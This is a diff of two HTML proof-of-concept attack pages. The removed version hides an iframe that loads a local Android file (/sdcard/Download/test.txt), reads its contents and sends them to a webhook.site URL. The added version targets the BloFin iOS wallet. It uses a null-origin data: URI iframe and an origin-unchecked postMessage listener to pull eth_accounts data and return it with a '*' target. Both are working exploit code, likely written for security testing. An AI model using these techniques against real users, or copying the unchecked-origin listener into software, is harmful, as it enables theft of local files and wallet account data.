@@ -1,45 +1,88 @@
-                <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
-    <title>Bypass PoC - Iframe Method</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BloFin Single File PostMessage Hijack - 0x403for</title>
+<style>
+body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:12px}
+h3{color:#f5c518}
+.box{border:1px solid #333;padding:10px;border-radius:10px;margin:10px 0;background:#111}
+pre{color:#0ff;white-space:pre-wrap;word-break:break-all;min-height:60px;background:#000;padding:8px;border-radius:6px;border:1px solid #333}
+button{width:100%;padding:13px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px}
+span{color:#888}
+</style>
 </head>
 <body>
-    <h3>Menguji Bypass via Iframe...</h3>
-    
-    <iframe id="targetFrame" src="file:///sdcard/Download/test.txt" style="display:none;"></iframe>
+<h3>BloFin iOS - Single File PostMessage Provider Hijack</h3>
+<div class="box">
+Parent Origin: <b id="orig"></b><br>
+Child Iframe Origin: <b>null (data: URI = simulasi evil.com)</b>
+<pre id="log">Ready - BloFin iOS 1.8.5
+</pre>
+</div>
 
+<button onclick="direct()">1. DIRECT eth_accounts (normal)</button>
+<button onclick="selfPost()">2. SELF postMessage injection (*)</button>
+<button onclick="createEvil()">3. CREATE evil iframe (null origin) + REQUEST</button>
+
+<div class="box">
+<iframe id="evil" style="width:100%;height:140px;border:1px solid #ff5555;border-radius:8px;display:none"></iframe>
+</div>
+
+<script>
+document.getElementById('orig').innerText = location.origin + " ("+location.href+")";
+const logEl = document.getElementById('log');
+const log = (m)=>{ logEl.innerText += "\n"+m; console.log(m); }
+
+// LISTENER VULN - ini yang di-test: kalau listener pakai * tanpa cek e.origin = BUG
+window.addEventListener("message", async (e)=>{
+  log(`[RECEIVED] origin=${e.origin} | data=${JSON.stringify(e.data).slice(0,200)}`);
+  
+  // Simulasi DApp yang insecure: forward request dari child ke provider tanpa cek origin
+  if(e.data && e.data.type==="REQUEST_ACCOUNTS"){
+    log(`-> Child dari origin ${e.origin} minta accounts! Mencoba window.ethereum...`);
+    try{
+      const acc = await window.ethereum.request({method:"eth_accounts"});
+      log(`-> PROVIDER LEAK! acc=${acc} - mengirim balik ke origin ${e.origin}`);
+      // VULN: kirim balik pakai * bukan e.origin
+      e.source.postMessage({type:"ACCOUNTS_LEAK", accounts: acc}, "*");
+    }catch(err){ log(`Provider blocked: ${err.message}`); }
+  }
+  if(e.data && e.data.type==="ACCOUNTS_LEAK"){
+    log(`!!! BUG CONFIRMED: Evil iframe dapat accounts: ${e.data.accounts} !!!`);
+  }
+});
+
+async function direct(){
+  try{
+    const a = await window.ethereum.request({method:"eth_accounts"});
+    log(`[DIRECT] SUCCESS: ${a}`);
+  }catch(e){ log(`[DIRECT] BLOCKED: ${e.message}`); }
+}
+
+function selfPost(){
+  log(`[SELF] Sending postMessage * dengan method eth_accounts`);
+  window.postMessage({type:"REQUEST_ACCOUNTS", method:"eth_accounts", jsonrpc:"2.0", id:1}, "*");
+}
+
+function createEvil(){
+  const iframe = document.getElementById('evil');
+  iframe.style.display='block';
+  const childHtml = `
+    <body style="background:#200;color:#fff;font-family:monospace;padding:8px">
+    <b>EVIL IFRAME (data: URI, origin=null)</b>
     <script>
-        const webhookUrl = 'https://webhook.site/8020a520-ac20-474c-bb29-35cf02751528';
-
-        window.onload = function() {
-            // Berikan jeda 1 detik agar iframe selesai memuat file secara sempurna
-            setTimeout(function() {
-                try {
-                    var frame = document.getElementById('targetFrame');
-                    // Mengakses konten teks di dalam iframe
-                    var stolenData = frame.contentWindow.document.body.innerText || frame.contentDocument.body.innerText;
-                    
-                    if (stolenData) {
-                        alert("Iframe Berhasil Membaca! Mengirim data...");
-                        sendExfil(stolenData);
-                    } else {
-                        sendError("Iframe termuat tapi konten kosong.");
-                    }
-                } catch (e) {
-                    sendError("Iframe terblokir SOP: " + e.message);
-                }
-            }, 1000);
-        };
-
-        function sendExfil(data) {
-            var img = new Image();
-            img.src = webhookUrl + "?method=iframe&data=" + encodeURIComponent(data);
-        }
-
-        function sendError(msg) {
-            var img = new Image();
-            img.src = webhookUrl + "?method=iframe_err&msg=" + encodeURIComponent(msg);
-        }
-    </script>
+      parent.postMessage({type:"REQUEST_ACCOUNTS", method:"eth_accounts"}, "*");
+      window.addEventListener("message", (e)=>{
+        document.body.innerHTML += "<br>Got: "+JSON.stringify(e.data);
+        parent.postMessage({type:"LOG", msg: "child got "+JSON.stringify(e.data)}, "*");
+      });
+    <\/script>
+  `;
+  // data URI = origin null, simulasi evil.com
+  iframe.src = "data:text/html;base64,"+btoa(childHtml);
+  log(`[EVIL] Created data: URI iframe with null origin, sent REQUEST_ACCOUNTS`);
+}
+</script>
 </body>
 </html>
